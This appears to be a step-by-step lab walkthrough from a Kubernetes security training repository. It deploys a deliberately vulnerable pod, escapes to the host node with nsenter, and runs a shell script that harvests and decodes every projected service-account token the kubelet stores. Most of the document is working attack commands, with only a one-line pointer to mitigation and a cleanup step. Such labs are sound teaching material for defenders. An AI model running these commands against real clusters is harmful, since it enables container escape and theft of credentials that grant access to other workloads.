# Attack: Container escape to service account token theft

## What this does

1. Escape from the compromised `frontend/web` pod to the node
2. Read projected service account tokens stored by `kubelet`
3. Enumerate them in a human-readable table (`namespace`, `service account`, `pod`, `token path`)

---

## Prepare the vulnerable pod (run on your machine)

```sh
mise run apps:start
kubectl delete pod web -n frontend --ignore-not-found
kubectl apply -k scenarios/00-container-escape/attack/
kubectl wait pod/web -n frontend --for=condition=Ready --timeout=60s
kubectl exec -it web -n frontend -- sh
```

All remaining commands run inside this shell.

---

## Escape to the node

```sh
nsenter -t 1 --mount -- sh
```

---

## Enumerate all projected service account tokens (human-readable)

```sh
decode_jwt_payload() {
  b64=$(printf '%s' "$1" | cut -d. -f2 | tr '_-' '/+')
  pad=$(( (4 - ${#b64} % 4) % 4 ))
  while [ "$pad" -gt 0 ]; do
    b64="${b64}="
    pad=$((pad - 1))
  done
  printf '%s' "$b64" | base64 -d 2>/dev/null
}

printf "%-16s %-28s %-32s %s\n" "NAMESPACE" "SERVICE_ACCOUNT" "POD" "TOKEN_PATH"
find /var/lib/kubelet/pods -path '*/volumes/kubernetes.io~projected/*/token' 2>/dev/null | while read -r t; do
  token=$(cat "$t" 2>/dev/null)
  [ -n "$token" ] || continue

  payload=$(decode_jwt_payload "$token")

  ns=$(printf '%s' "$payload" | sed -n 's/.*"namespace":"\([^"]*\)".*/\1/p' | head -n 1)
  [ -n "$ns" ] || ns=$(cat "${t%/token}/namespace" 2>/dev/null)
  [ -n "$ns" ] || ns="<unknown>"

  sa=$(printf '%s' "$payload" | sed -n 's/.*"serviceaccount":{"name":"\([^"]*\)".*/\1/p' | head -n 1)
  [ -n "$sa" ] || sa=$(printf '%s' "$payload" | sed -n 's/.*"kubernetes.io\/serviceaccount\/service-account.name":"\([^"]*\)".*/\1/p' | head -n 1)
  [ -n "$sa" ] || sa="<unknown>"

  pod=$(printf '%s' "$payload" | sed -n 's/.*"pod":{"name":"\([^"]*\)".*/\1/p' | head -n 1)
  [ -n "$pod" ] || pod=$(printf '%s' "$payload" | sed -n 's/.*"kubernetes.io\/pod\/name":"\([^"]*\)".*/\1/p' | head -n 1)
  [ -n "$pod" ] || pod="<unknown>"

  printf "%-16s %-28s %-32s %s\n" "$ns" "$sa" "$pod" "${t%%/volumes/*}"
done | sort -u
```

## Mitigation

Now, run the mitigation instruction.

---

## Cleanup (run on your machine)

```sh
kubectl delete pod web -n frontend --ignore-not-found
kubectl apply -k apps/
kubectl wait pod/web -n frontend --for=condition=Ready --timeout=60s
```
